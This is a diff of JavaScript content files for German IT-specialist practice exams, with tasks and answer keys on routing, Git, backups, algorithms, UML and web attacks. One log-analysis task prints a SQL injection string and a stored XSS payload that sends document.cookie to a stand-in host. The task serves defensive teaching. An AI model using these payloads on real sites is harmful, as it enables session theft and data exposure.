+        a: ['Knoten 1 bis 8 und ein Endknoten 9 (N = 9), Kanten 1-2, 2-3, 3-4, 3-5, 4-5, 5-2, 2-6, 6-7, 6-8, 7-9, 8-9 (E = 11).', '**M = E - N + 2 = 11 - 9 + 2 = 4**, alternativ Anzahl Entscheidungen (while, if, if) + 1 = 4.', 'Zweigüberdeckung mit **2 Testfällen**: **akku = []** (while sofort falsch, anzahl == 0 wahr: Ergebnis 0) und **akku = [50, -1]** (while wahr, if wahr bei 50, if falsch bei -1, anzahl == 0 falsch: Ergebnis 50,0). Damit ist jede Kante mindestens einmal durchlaufen.', 'Bewertung: Graph 2 P, M 2 P, Testfälle 2 P.'],
+        sol: [['diagram', {w: 640, h: 520, cap: 'Kontrollflussgraph: 9 Knoten, 11 Kanten, drei Entscheidungsknoten (2, 3, 6)', nodes: [
+          {id: 'n1', k: 'circle', x: 320, y: 30, w: 40, h: 40, t: '1'}, {id: 'n2', k: 'circle', x: 320, y: 100, w: 40, h: 40, t: '2', s: 'accent'},
+          {id: 'n3', k: 'circle', x: 220, y: 180, w: 40, h: 40, t: '3', s: 'accent'}, {id: 'n4', k: 'circle', x: 140, y: 260, w: 40, h: 40, t: '4'},
+          {id: 'n5', k: 'circle', x: 220, y: 330, w: 40, h: 40, t: '5'}, {id: 'n6', k: 'circle', x: 450, y: 260, w: 40, h: 40, t: '6', s: 'accent'},
+          {id: 'n7', k: 'circle', x: 380, y: 360, w: 40, h: 40, t: '7'}, {id: 'n8', k: 'circle', x: 520, y: 360, w: 40, h: 40, t: '8'}, {id: 'n9', k: 'circle', x: 450, y: 450, w: 40, h: 40, t: 'Ende'},
+        ], edges: [{a: 'n1', b: 'n2'}, {a: 'n2', b: 'n3', t: 'i < n'}, {a: 'n3', b: 'n4', t: '≥ 0'}, {a: 'n3', b: 'n5', t: '< 0', lo: [16, 0]}, {a: 'n4', b: 'n5'},
+          {a: 'n5', b: 'n2', via: [[60, 330], [60, 100]]}, {a: 'n2', b: 'n6', t: 'sonst'}, {a: 'n6', b: 'n7', t: 'anzahl = 0'}, {a: 'n6', b: 'n8'}, {a: 'n7', b: 'n9'}, {a: 'n8', b: 'n9'}]}]],
+        see: ['ps-ueberdeckung', 'eua-testfaelle']},
+      {pts: 6, rows: 8, topic: 'Git und CI/CD', q: 'a) Beschreiben Sie einen Feature-Branch-Workflow mit Git (Befehle für: Branch anlegen, Änderung sichern, auf den Server übertragen) und wie Änderungen per Pull Request in main gelangen. b) Beim Mergen tritt ein **Konflikt** in tarif.py auf. Wie lösen Sie ihn? c) Nennen Sie vier sinnvolle Stufen einer CI/CD-Pipeline.',
+        a: [['code', 'text', `git switch -c feature/abo-rabatt      # Branch anlegen und wechseln
+git add tarif.py                      # Änderung vormerken
+git commit -m "Abo-Rabatt nach Deckelung abziehen"
+git push -u origin feature/abo-rabatt # Branch auf den Server
+# danach Pull Request (Merge Request): Code-Review, automatische Tests, dann Merge in main`],
+          'b) Git markiert die Stelle mit **<<<<<<<, =======, >>>>>>>**. Beide Versionen prüfen, die richtige bzw. zusammengeführte Fassung von Hand herstellen, Marker entfernen, Tests ausführen, dann **git add tarif.py** und **git commit** (bzw. git merge --continue). Bei Unklarheit mit dem Autor der anderen Änderung sprechen.', 'c) **Build** (kompilieren, Container-Image), **Unit- und Integrationstests**, **statische Codeanalyse / Sicherheits-Scan** (zum Beispiel Abhängigkeiten auf bekannte Schwachstellen), **Deployment in eine Test-/Staging-Umgebung**, Abnahme bzw. End-to-End-Tests, **Deployment in Produktion** (Continuous Delivery mit Freigabe, Continuous Deployment automatisch).'],
+        sol: [['diagram', {w: 760, h: 170, keep: 620, cap: 'Feature-Branch: Abzweigen von main, Commits auf dem Branch, Merge per Pull Request', nodes: [
+          {id: 'm1', k: 'circle', x: 60, y: 50, w: 30, h: 30, t: ''}, {id: 'm2', k: 'circle', x: 180, y: 50, w: 30, h: 30, t: ''}, {id: 'm3', k: 'circle', x: 420, y: 50, w: 30, h: 30, t: ''}, {id: 'm4', k: 'circle', x: 600, y: 50, w: 34, h: 34, t: 'M', s: 'solid'},
+          {id: 'f1', k: 'circle', x: 280, y: 125, w: 30, h: 30, t: '', s: 'accent'}, {id: 'f2', k: 'circle', x: 400, y: 125, w: 30, h: 30, t: '', s: 'accent'}, {id: 'f3', k: 'circle', x: 510, y: 125, w: 30, h: 30, t: '', s: 'accent'},
+          {id: 'lm', k: 'text', x: 700, y: 50, t: 'main', w: 10, h: 10, b: true}, {id: 'lf', k: 'text', x: 640, y: 125, t: 'feature/abo-rabatt', w: 10, h: 10},
+        ], edges: [{a: 'm1', b: 'm2'}, {a: 'm2', b: 'm3'}, {a: 'm3', b: 'm4'}, {a: 'm2', b: 'f1'}, {a: 'f1', b: 'f2'}, {a: 'f2', b: 'f3'}, {a: 'f3', b: 'm4', t: 'Pull Request'}]}],
+          ['diagram', AP2.dg.flow(['Commit / Push', 'Build', 'Tests', 'Code-Analyse', 'Staging', 'Produktion'], {w: 780, h: 100, bw: 115, styles: ['plain', 'accent', 'accent', 'accent', 'gold', 'ok'], cap: 'CI/CD-Pipeline: Jede Stufe muss grün sein, bevor die nächste startet'})]],
+        see: ['ps-git', 'ps-ide']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 4: Infrastruktur und IT-Sicherheit (25 Punkte)',
+    tasks: [
+      {pts: 7, rows: 9, topic: 'Routing', q: 'Vervollständigen Sie die Routingtabelle von Router **R1** (Ziel/Präfix, Next Hop, Interface) und beantworten Sie: a) Über welchen Next Hop gelangt ein Paket an **10.10.100.7**? b) Der Provider-Router soll die beiden Büronetze 10.10.0.0/24 und 10.10.1.0/24 mit **einem** Eintrag erreichen. Wie lautet die zusammengefasste Route?',
+        ctx: [['diagram', {w: 860, h: 300, keep: 700, cap: 'Netzwerk VeloCity (Ausschnitt)', nodes: [
+          {id: 'lan0', k: 'box', x: 110, y: 60, w: 190, h: 50, t: ['Zentrale LAN', '10.10.0.0/24'], s: 'soft'}, {id: 'r1', k: 'circle', x: 330, y: 150, w: 70, h: 70, t: 'R1', s: 'accent'},
+          {id: 'r2', k: 'circle', x: 600, y: 60, w: 70, h: 70, t: 'R2', s: 'accent'}, {id: 'lan1', k: 'box', x: 770, y: 60, w: 160, h: 50, t: ['Werkstatt', '10.10.1.0/24'], s: 'soft'},
+          {id: 'r3', k: 'circle', x: 600, y: 240, w: 70, h: 70, t: 'R3', s: 'accent'}, {id: 'lan3', k: 'box', x: 770, y: 240, w: 160, h: 50, t: ['Stationsnetz', '10.10.64.0/18'], s: 'soft'},
+          {id: 'isp', k: 'oval', x: 110, y: 240, w: 170, h: 60, t: ['Provider', '203.0.113.1'], s: 'gold'},
+        ], edges: [{a: 'lan0', b: 'r1', ea: 'none', t: 'eth0 .1'}, {a: 'r1', b: 'r2', ea: 'none', t: 'eth1: 192.168.255.0/30 (.1 / .2)'}, {a: 'r1', b: 'r3', ea: 'none', t: 'eth2: 192.168.255.4/30 (.5 / .6)'},
+          {a: 'r2', b: 'lan1', ea: 'none'}, {a: 'r3', b: 'lan3', ea: 'none'}, {a: 'r1', b: 'isp', ea: 'none', t: 'eth3'}]}]],
+        a: [['table', ['Ziel / Präfix', 'Next Hop', 'Interface'], [['10.10.0.0/24', 'direkt verbunden', 'eth0'], ['192.168.255.0/30', 'direkt verbunden', 'eth1'], ['192.168.255.4/30', 'direkt verbunden', 'eth2'], ['10.10.1.0/24', '**192.168.255.2** (R2)', 'eth1'], ['10.10.64.0/18', '**192.168.255.6** (R3)', 'eth2'], ['0.0.0.0/0 (Default)', '**203.0.113.1**', 'eth3']]],
+          'a) 10.10.100.7 liegt in **10.10.64.0/18** (10.10.64.0 bis 10.10.127.255), also Next Hop **192.168.255.6** (R3).', 'b) 10.10.0.0/24 und 10.10.1.0/24 unterscheiden sich erst im **letzten Bit des dritten Oktetts** (0000 0000 / 0000 0001): Zusammenfassung **10.10.0.0/23**.', 'Bewertung: Tabelle 4 P (Default-Route zwingend), a) 1,5 P, b) 1,5 P.'],
+        sol: [['table', ['3. Oktett', 'binär', ''], [['0', '0000 000**0**', '10.10.0.0/24'], ['1', '0000 000**1**', '10.10.1.0/24'], ['gemeinsam', '**0000 000**x', '23 gleiche Bits: 10.10.0.0/23']]], ['tool', 'route']],
+        see: ['infra-routing', 'infra-subnetting']},
+      {pts: 6, rows: 8, topic: 'Angriffe erkennen', q: 'Im Webserver-Log der App-API finden Sie die Einträge der Anlage. Benennen Sie die drei Angriffsarten, beurteilen Sie, ob der erste Angriff vermutlich erfolgreich war, und nennen Sie je zwei Gegenmaßnahmen.',
+        ctx: [['code', 'text', `203.0.113.45 [02/Nov/2026:03:12:01] "GET /api/stationen?id=7%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 51234
+198.51.100.9 [02/Nov/2026:03:14:22] "POST /login HTTP/1.1" 401 112
+   ... 1.840 weitere POST /login von 198.51.100.9 innerhalb von 10 Minuten, Benutzer "admin", wechselnde Passwörter
+192.0.2.77   [02/Nov/2026:03:20:10] "POST /api/feedback HTTP/1.1" 201 88
+   Body: {"text": "<script>fetch('https://evil.example/c?'+document.cookie)</script>"}`]],
+        a: ['1. **SQL-Injection**: Der Parameter enthält URL-kodiert **7\' OR \'1\'=\'1**. Status 200 und eine **ungewöhnlich große Antwort (51 KB)** deuten auf **Erfolg** hin (vermutlich alle Datensätze statt einer Station). Maßnahmen: **Prepared Statements**, Eingabevalidierung (id muss Zahl sein), minimale DB-Rechte, Web Application Firewall.', '2. **Brute-Force-Angriff** (Passwortraten, eventuell Credential Stuffing) auf das Konto admin. Maßnahmen: **Rate Limiting**/temporäre Sperre nach Fehlversuchen, **Zwei-Faktor-Authentisierung**, kein Standard-Benutzername "admin", Alarmierung, IP sperren (Fail2ban).', '3. **Stored (persistentes) Cross-Site-Scripting (XSS)**: Das Skript wird gespeichert und bei anderen Nutzern (zum Beispiel im Admin-Backend) ausgeführt, um Session-Cookies zu stehlen. Maßnahmen: **kontextgerechte Ausgabekodierung** (Escaping), **Content Security Policy**, Cookies mit **HttpOnly** und Secure, Eingaben validieren bzw. bereinigen.'],
+        sol: [['note', 'Dekodiert: %27 = \' , %20 = Leerzeichen, %3D = = . Aus id=7%27%20OR%20%271%27%3D%271 wird id=7\' OR \'1\'=\'1. Ist die Abfrage als Zeichenkette zusammengesetzt, lautet sie ... WHERE id = \'7\' OR \'1\'=\'1\' und liefert alle Zeilen.']],
+        see: ['infra-angriffe', 'infra-websec', 'infra-schwachstellen']},
+      {pts: 6, rows: 8, topic: 'Digitale Signatur', q: 'Der Schlosshersteller verteilt **Firmware-Updates** über LTE. a) Beschreiben Sie, wie eine **digitale Signatur** sicherstellt, dass nur echte Firmware installiert wird (welcher Schlüssel wird wo verwendet?). b) Die Firmware soll zusätzlich vertraulich übertragen werden. Erklären Sie das Prinzip der **hybriden Verschlüsselung**.',
+        a: ['a) Der Hersteller berechnet den **Hashwert** der Firmware und verschlüsselt ihn mit seinem **privaten Schlüssel**: das ist die **Signatur**. Das Schloss enthält ab Werk den **öffentlichen Schlüssel** des Herstellers (oder dessen Zertifikat). Es berechnet selbst den Hash der empfangenen Firmware, entschlüsselt die Signatur mit dem öffentlichen Schlüssel und vergleicht beide Werte. Nur bei Gleichheit wird installiert: **Integrität und Authentizität** sind belegt. Der private Schlüssel verlässt nie den Hersteller (HSM).', 'b) **Hybrid**: Die große Firmware wird mit einem zufälligen **symmetrischen Sitzungsschlüssel** (zum Beispiel AES) verschlüsselt, weil das schnell ist. Dieser kleine Schlüssel wird mit dem **öffentlichen Schlüssel des Empfängers asymmetrisch** verschlüsselt (oder per Diffie-Hellman ausgehandelt). So verbindet man die Geschwindigkeit symmetrischer mit dem einfachen Schlüsselaustausch asymmetrischer Verfahren (Prinzip von TLS).'],
+        sol: [['seq', {w: 760, actors: ['Hersteller', 'Update-Server', 'Schloss'], cap: 'Signieren mit dem privaten, Prüfen mit dem öffentlichen Schlüssel', steps: [
+          ['note', 0, 'Hash h = SHA-256(Firmware)'], ['note', 0, 'Signatur s = sign(h, privater Schlüssel)'], [0, 1, 'Firmware + Signatur', 's'], [1, 2, 'Firmware + Signatur (über TLS)', 's'],
+          ['note', 2, 'h2 = SHA-256(Firmware)'], ['note', 2, 'verify(s, öffentlicher Schlüssel) = h2 ?'], [2, 1, 'installiert (ja) / verworfen (nein)', 'r']]}]],
+        see: ['infra-krypto', 'infra-pki']},
+      {pts: 6, rows: 8, topic: 'Datensicherung', q: 'Die Datenbank hat sonntags eine **Vollsicherung von 800 GB**; täglich ändern sich **40 GB** (jeden Tag andere Daten). Montag bis Samstag wird nachts gesichert. a) Berechnen Sie die Datenmenge der Sicherungen von Montag bis Samstag bei inkrementeller und bei differenzieller Sicherung. b) Am Donnerstagvormittag fällt die Datenbank aus. Welche Sicherungen brauchen Sie jeweils für die Wiederherstellung? c) Wie lange dauert allein die Übertragung der Vollsicherung über eine Verbindung mit effektiv **1 Gbit/s** (1 GB = 1.000 MB)?',
+        a: ['a) **Inkrementell** (Änderungen seit der letzten Sicherung jeder Art): 6 x 40 GB = **240 GB**. **Differenziell** (Änderungen seit der letzten Vollsicherung): 40 + 80 + 120 + 160 + 200 + 240 = **840 GB**.', 'b) Inkrementell: **Vollsicherung + Montag + Dienstag + Mittwoch** (4 Sicherungen in der richtigen Reihenfolge). Differenziell: **Vollsicherung + Mittwoch** (2 Sicherungen). Daten seit Mittwochnacht sind verloren (RPO), wenn nicht zusätzlich Transaktionsprotokolle gesichert werden.', 'c) 800 GB x 8 = 6.400 Gbit; 6.400 Gbit / 1 Gbit/s = **6.400 s ≈ 107 Minuten (1 h 47 min)**.'],
+        sol: [['chart', {kind: 'bar', w: 720, h: 300, labels: ['Mo', 'Di', 'Mi', 'Do', 'Fr', 'Sa'], series: [{n: 'inkrementell (GB)', d: [40, 40, 40, 40, 40, 40], k: 'text3'}, {n: 'differenziell (GB)', d: [40, 80, 120, 160, 200, 240], k: 'accent'}], vals: true, ymax: 250, yl: 'GB je Sicherung', cap: 'Differenzielle Sicherungen wachsen täglich, dafür reichen zur Wiederherstellung zwei Sicherungen'}], ['tool', 'transfer']],
+        see: ['infra-backup']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/eua5-1.js
+// Probeprüfung 5, Entwicklung und Umsetzung von Algorithmen: VeloCity Leipzig GmbH, Bikesharing.
+(function () {
+  const ID = 'exam5-eua';
+  const bars = (vals, sorted, cap) => ['chart', {kind: 'bar', w: 620, h: 220, labels: vals.map((v, i) => (i < sorted ? '✓ ' : '') + i), series: [{n: 'Wert', d: vals, k: 'accent'}], vals: true, ymax: 100, cap}];
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 5 (Mobilität)', t: 'Entwicklung und Umsetzung von Algorithmen: Bikesharing VeloCity', blocks: []});
+  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.eua,
+    hint: 'Schwerpunkte: Tariflogik, Struktogramm in Code umsetzen, Fehlersuche im Sortieralgorithmus, Rekursion, UML aus Code, eigene Exceptions, Collections, Konstruktorverkettung und static, SQL mit Self-Join und verschachtelter Aggregation, NoSQL, HTML-Formulare, CSV-Verarbeitung, Grenzwerttests, Bitoperationen.',
+    intro: [['p', 'Sie entwickeln bei der **Saxon Apps GmbH** die Plattform **VeloCity 2.0** für den Bikesharing-Anbieter **VeloCity Leipzig GmbH** (1.800 Räder, 260 Stationen).'],
+      ['kv', [['Tarif', '1,00 Euro für die ersten **30 Minuten**, danach **0,50 Euro je angefangene 15 Minuten**. Je Ausleihe höchstens **15,00 Euro**.'], ['Abo-Kunden', 'zahlen **1,00 Euro weniger** (nie unter 0). Der Höchstpreis gilt **vor** dem Abzug.'], ['Dauer', 'wird in ganzen Minuten übergeben (mindestens 1)']]]]});
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 1: Tarife und Auswertungen (25 Punkte)',
+    tasks: [
+      {pts: 8, rows: 12, topic: 'Algorithmus entwickeln', q: 'Entwickeln Sie die Funktion **preis(minuten, abo)** nach dem Tarif in der Ausgangssituation. Bei minuten < 1 soll eine Ausnahme bzw. ein Fehler ausgelöst werden. Hinweis: Die Anzahl angefangener 15-Minuten-Blöcke berechnen Sie zum Beispiel mit aufrunden(x / 15) oder (x + 14) DIV 15.',
+        a: [['codes', [['pseudo', `funktion preis(minuten, abo)
+    wenn minuten < 1 dann
+        fehler "ungültige Dauer"
+    ende wenn
+    p = 1.00
+    wenn minuten > 30 dann
+        bloecke = (minuten - 30 + 14) DIV 15      // angefangene 15 Minuten
+        p = p + bloecke * 0.50
+    ende wenn
+    wenn p > 15.00 dann
+        p = 15.00
+    ende wenn
+    wenn abo dann
+        p = max(0, p - 1.00)
+    ende wenn
+    rückgabe p
+ende funktion`], ['java', `static double preis(int minuten, boolean abo) {
+    if (minuten < 1) throw new IllegalArgumentException("ungültige Dauer");
+    double p = 1.00;
+    if (minuten > 30) {
+        int bloecke = (minuten - 30 + 14) / 15;   // Ganzzahldivision = aufrunden
+        p += bloecke * 0.50;
+    }
+    p = Math.min(p, 15.00);
+    if (abo) p = Math.max(0, p - 1.00);
+    return p;
+}`], ['python', `import math
+
+def preis(minuten, abo):
+    if minuten < 1:
+        raise ValueError("ungültige Dauer")
+    p = 1.00
+    if minuten > 30:
+        p += math.ceil((minuten - 30) / 15) * 0.50
+    p = min(p, 15.00)
+    if abo:
+        p = max(0, p - 1.00)
+    return p`]]],
+          'Bewertung: Fehlerfall (1 P), Grundpreis (1 P), Blockberechnung mit Aufrunden (3 P), Deckelung (1 P), Abo-Abzug nach Deckelung und nicht negativ (2 P).', 'Kontrolle: preis(42, false) = 1,00 + 1 x 0,50 = **1,50**; preis(80, false) = 1,00 + 4 x 0,50 = **3,00**; preis(15, true) = **0,00**.'],
+        sol: [['chart', {kind: 'line', w: 720, h: 280, labels: ['1', '30', '31', '45', '46', '60', '61', '120', '240', '435', '436', '600'], series: [{n: 'Normaltarif (Euro)', d: [1, 1, 1.5, 1.5, 2, 2, 2.5, 4, 8, 14.5, 15, 15], k: 'accent'}, {n: 'Abo (Euro)', d: [0, 0, 0.5, 0.5, 1, 1, 1.5, 3, 7, 13.5, 14, 14], k: 'ok'}], ymax: 16, yl: 'Euro', cap: 'Tarifkurve (Minuten auf der Achse nicht maßstäblich): Stufen alle 15 Minuten, Deckel bei 15 Euro ab 436 Minuten'}]],
+        see: ['eua-algoexam', 'eua-kontroll']},
+      {pts: 7, rows: 11, topic: 'Struktogramm umsetzen', q: 'Setzen Sie das Struktogramm in Programmcode um. Ein Rad hat die Attribute id und akku (Prozent). Geben Sie außerdem das Ergebnis für raeder = [(11, 15), (12, 80), (13, 19), (14, 55)] an.',
+        ctx: [['diagram', AP2.dg.nsd([['act', 'ladeliste = leere Liste'], ['act', 'summe = 0'], ['for', 'für jedes rad in raeder', [['act', 'summe = summe + rad.akku'], ['if', 'rad.akku < 20 ?', [['act', 'ladeliste.hinzufügen(rad.id)']], [['act', '–']]]]],
+          ['if', 'länge(raeder) > 0 ?', [['act', 'schnitt = summe / länge(raeder)']], [['act', 'schnitt = 0']]], ['act', 'rückgabe ladeliste, schnitt']], {w: 600, cap: 'Struktogramm ladeAuswertung(raeder)'})]],
+        a: [['codes', [['java', `static Object[] ladeAuswertung(List<Rad> raeder) {
+    List<Integer> ladeliste = new ArrayList<>();
+    int summe = 0;
+    for (Rad rad : raeder) {
+        summe += rad.getAkku();
+        if (rad.getAkku() < 20) {
+            ladeliste.add(rad.getId());
+        }
+    }
+    double schnitt = raeder.size() > 0 ? (double) summe / raeder.size() : 0;
+    return new Object[]{ladeliste, schnitt};   // oder eigene Ergebnisklasse
+}`], ['python', `def lade_auswertung(raeder):
+    ladeliste = []
+    summe = 0
+    for rad in raeder:
+        summe += rad.akku
+        if rad.akku < 20:
+            ladeliste.append(rad.id)
+    schnitt = summe / len(raeder) if len(raeder) > 0 else 0
+    return ladeliste, schnitt`]]],
+          'Ergebnis: ladeliste = **[11, 13]**, schnitt = (15 + 80 + 19 + 55) / 4 = 169 / 4 = **42,25**.', 'Bewertung: Initialisierung (1 P), Schleife mit Summe (2 P), Bedingung und Liste (2 P), Division mit Schutz vor 0 und ohne Ganzzahldivision (1 P), Ergebnis (1 P).'],
+        see: ['ps-struktogramm', 'eua-kontroll']},
+      {pts: 6, rows: 9, topic: 'Fehlersuche', q: 'Ein Kollege hat Selection Sort implementiert, um Räder nach Akkustand aufsteigend zu sortieren. Das Programm sortiert falsch und stürzt manchmal ab. a) Finden Sie die **zwei Fehler** und geben Sie die korrigierten Zeilen an. b) Geben Sie für das korrigierte Programm das Feld nach jedem Durchlauf der äußeren Schleife an: a = [42, 7, 93, 15, 7].',
+        ctx: [['code', 'pseudo', ` 1  funktion selectionSort(a)
+ 2      für i = 0 bis länge(a) - 2
+ 3          min = i
+ 4          für j = i + 1 bis länge(a) - 2
+ 5              wenn a[j] < a[min] dann
+ 6                  min = a[j]
+ 7              ende wenn
+ 8          ende für
+ 9          tausche a[i] mit a[min]
+10      ende für
+11  ende funktion`]],
+        a: ['a) **Zeile 4:** Die innere Schleife muss bis **länge(a) - 1** laufen, sonst wird das letzte Element nie verglichen. **Zeile 6:** Es muss der **Index** gemerkt werden: **min = j**. Mit min = a[j] wird ein Wert als Index benutzt: falsche Vergleiche und Zugriff außerhalb des Feldes (Absturz bei Werten ≥ länge(a)).',
+          ['table', ['Durchlauf i', 'gefundenes Minimum', 'Feld danach'], [['Start', '-', '42, 7, 93, 15, 7'], ['0', '7 an Index 1', '**7**, 42, 93, 15, 7'], ['1', '7 an Index 4', '7, **7**, 93, 15, 42'], ['2', '15 an Index 3', '7, 7, **15**, 93, 42'], ['3', '42 an Index 4', '7, 7, 15, **42**, 93']]],
+          'Bewertung: je Fehler mit Korrektur 1,5 P, Durchläufe 3 P.'],
+        sol: [['walk', {t: 'Selection Sort nach der Korrektur', steps: [
+          {t: '**Start:** Nichts ist sortiert.', b: [bars([42, 7, 93, 15, 7], 0, 'Ausgangsfeld')]},
+          {t: '**i = 0:** Minimum im ganzen Feld ist 7 (Index 1, die erste 7 wegen echtem <). Tausch mit Index 0.', b: [bars([7, 42, 93, 15, 7], 1, 'Index 0 fertig')]},
+          {t: '**i = 1:** Minimum in Index 1 bis 4 ist die 7 an Index 4. Hier sieht man, warum Zeile 4 wichtig ist: Ohne den Vergleich mit dem letzten Element bliebe diese 7 hinten.', b: [bars([7, 7, 93, 15, 42], 2, 'Index 0 und 1 fertig')]},
+          {t: '**i = 2:** Minimum 15 an Index 3, Tausch mit 93.', b: [bars([7, 7, 15, 93, 42], 3, 'drei fertig')]},
+          {t: '**i = 3:** Minimum 42, Tausch mit 93. Das letzte Element ist automatisch richtig. Laufzeit immer **O(n²)** Vergleiche, aber höchstens n - 1 Tausche; das Verfahren ist **nicht stabil**.', b: [bars([7, 7, 15, 42, 93], 5, 'sortiert'), ['tool', 'sort']]},
+        ]}]],
+        see: ['eua-sortieren', 'eua-debugging']},
+      {pts: 4, topic: 'Rekursion', q: 'Gegeben ist die rekursive Funktion f. a) Berechnen Sie f(84, 36) und geben Sie alle Aufrufe an. b) Was berechnet die Funktion, und wie heißt das Verfahren? c) Wodurch ist sichergestellt, dass die Rekursion endet?',
+        ctx: [['code', 'pseudo', `funktion f(a, b)
+    wenn b = 0 dann
+        rückgabe a
+    sonst
+        rückgabe f(b, a MOD b)
+    ende wenn
+ende funktion`]],
+        a: ['a) f(84, 36) → f(36, 84 MOD 36 = 12) → f(12, 36 MOD 12 = 0) → **12** (3 Aufrufe).', 'b) Den **größten gemeinsamen Teiler (ggT)**, nach dem **euklidischen Algorithmus**.', 'c) **Abbruchbedingung** b = 0; da a MOD b immer kleiner als b ist, wird der zweite Parameter bei jedem Aufruf echt kleiner und erreicht nach endlich vielen Schritten 0.'],
+        sol: [['diagram', AP2.dg.col(['f(84, 36)', 'f(36, 12)', 'f(12, 0)  →  12'], {w: 420, bw: 220, styles: ['accent', 'accent', 'ok'], edgeText: ['84 MOD 36 = 12', '36 MOD 12 = 0'], cap: 'Aufrufkette; das Ergebnis 12 wird unverändert zurückgegeben (Endrekursion)'})]],
+        see: ['eua-rekursion']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 2: Objektorientierte Umsetzung (25 Punkte)',
+    ctx: [['h3', 'Anlage: Quellcode (Auszug)'], ['code', 'java', `interface Ladbar {
+    int getAkku();
+    void laden(int prozent);
+}
+
+abstract class Rad {
+    private final int id;
+    protected double kmStand;
+    private static int anzahl = 0;
+
+    public Rad(int id) { this.id = id; anzahl++; }
+    public int getId() { return id; }
+    public static int getAnzahl() { return anzahl; }
+    public abstract double preisfaktor();
+}
+
+class EBike extends Rad implements Ladbar {
+    private int akku;
+    public EBike(int id, int akku) { super(id); this.akku = akku; }
+    public int getAkku() { return akku; }
+    public void laden(int prozent) { akku = Math.min(100, akku + prozent); }
+    public double preisfaktor() { return 1.5; }
+}
+
+class Station {
+    private String name;
+    private int kapazitaet;
+    private List<Rad> raeder = new ArrayList<>();
+    public Rad ausleihen(int radId) throws RadNichtGefundenException { /* Aufgabe 2.2 */ }
+    public void zurueckgeben(Rad r) throws StationVollException { /* Aufgabe 2.2 */ }
+}`]],
+    tasks: [
+      {pts: 6, rows: 9, topic: 'UML aus Code', q: 'Erstellen Sie zum Quellcode der Anlage ein **UML-Klassendiagramm** mit Sichtbarkeiten, Datentypen, abstrakten und statischen Elementen sowie allen Beziehungen.',
+        a: ['- **Ladbar** als «interface» mit + getAkku(): int und + laden(prozent: int).', '- **Rad** abstrakt («abstract» oder kursiv): - id: int {readOnly}, **# kmStand: double** (protected = #), - anzahl: int **unterstrichen** (static), + Rad(id: int), + getId(): int, + getAnzahl(): int (unterstrichen), + preisfaktor(): double {abstract}.', '- **EBike** erbt von Rad (durchgezogene Linie, leeres Dreieck) und **realisiert** Ladbar (gestrichelt, leeres Dreieck); - akku: int.', '- **Station** (- name: String, - kapazitaet: int) mit **Aggregation** zu Rad: Station 0..1 ◇ 0..* Rad (Räder existieren auch ohne Station, zum Beispiel während der Fahrt).', 'Bewertung: Klassen und Interface (2 P), Sichtbarkeiten, static, abstract (2 P), Vererbung und Realisierung (1 P), Aggregation mit Multiplizitäten (1 P).'],
+        sol: [['diagram', {w: 860, h: 400, keep: 700, cap: 'Musterlösung (statische Elemente sind im UML unterstrichen, hier mit dem Hinweis {static})', nodes: [
+          {id: 'l', k: 'cls', x: 700, y: 70, w: 230, s: 'accent', t: {name: ['«interface»', 'Ladbar'], ops: ['+ getAkku(): int', '+ laden(prozent: int): void']}},
+          {id: 'r', k: 'cls', x: 300, y: 100, w: 300, t: {name: ['«abstract»', 'Rad'], attrs: ['- id: int {readOnly}', '# kmStand: double', '- anzahl: int {static}'], ops: ['+ Rad(id: int)', '+ getId(): int', '+ getAnzahl(): int {static}', '+ preisfaktor(): double {abstract}']}},
+          {id: 'e', k: 'cls', x: 500, y: 320, w: 260, t: {name: 'EBike', attrs: ['- akku: int'], ops: ['+ EBike(id: int, akku: int)', '+ getAkku(): int', '+ laden(prozent: int): void', '+ preisfaktor(): double']}},
+          {id: 's', k: 'cls', x: 100, y: 330, w: 200, t: {name: 'Station', attrs: ['- name: String', '- kapazitaet: int'], ops: ['+ ausleihen(radId: int): Rad', '+ zurueckgeben(r: Rad): void']}},
+        ], edges: [{a: 'e', b: 'r', ea: 'tri', via: [[500, 245], [380, 245]]}, {a: 'e', b: 'l', k: 'dash', ea: 'tri', via: [[700, 320]]}, {a: 's', b: 'r', sa: 'dia', ea: 'none', ta: '0..1', tb: '0..*', via: [[100, 160]]}]}]],
+        see: ['eua-umlcode', 'ps-klassen']},
+      {pts: 8, rows: 14, topic: 'Methoden mit Exceptions', q: 'Implementieren Sie in Station die Methoden **ausleihen(radId)** (sucht das Rad, entfernt es aus der Liste und gibt es zurück; ist es nicht vorhanden, wird eine **RadNichtGefundenException** geworfen) und **zurueckgeben(r)** (fügt das Rad hinzu; ist die Kapazität erreicht, wird eine **StationVollException** geworfen). Implementieren Sie auch die Klasse StationVollException.',
+        a: [['codes', [['java', `class StationVollException extends Exception {
+    public StationVollException(String station) {
+        super("Station " + station + " ist voll");
+    }
+}
+
+public Rad ausleihen(int radId) throws RadNichtGefundenException {
+    for (int i = 0; i < raeder.size(); i++) {
+        if (raeder.get(i).getId() == radId) {
+            return raeder.remove(i);           // entfernt und liefert das Rad
+        }
+    }
+    throw new RadNichtGefundenException("Rad " + radId + " nicht an " + name);
+}
+
+public void zurueckgeben(Rad r) throws StationVollException {
+    if (raeder.size() >= kapazitaet) {
+        throw new StationVollException(name);
+    }
+    raeder.add(r);
+}`], ['python', `class StationVollException(Exception):
+    def __init__(self, station):
+        super().__init__(f"Station {station} ist voll")
+
+def ausleihen(self, rad_id):
+    for i, rad in enumerate(self.__raeder):
+        if rad.get_id() == rad_id:
+            return self.__raeder.pop(i)
+    raise RadNichtGefundenException(f"Rad {rad_id} nicht an {self.__name}")
+
+def zurueckgeben(self, rad):
+    if len(self.__raeder) >= self.__kapazitaet:
+        raise StationVollException(self.__name)
+    self.__raeder.append(rad)`], ['csharp', `class StationVollException : Exception
+{
+    public StationVollException(string station) : base($"Station {station} ist voll") { }
+}
+
+public Rad Ausleihen(int radId)
+{
+    Rad rad = raeder.Find(r => r.GetId() == radId)
+              ?? throw new RadNichtGefundenException($"Rad {radId} nicht an {name}");
+    raeder.Remove(rad);
+    return rad;
+}`]]],
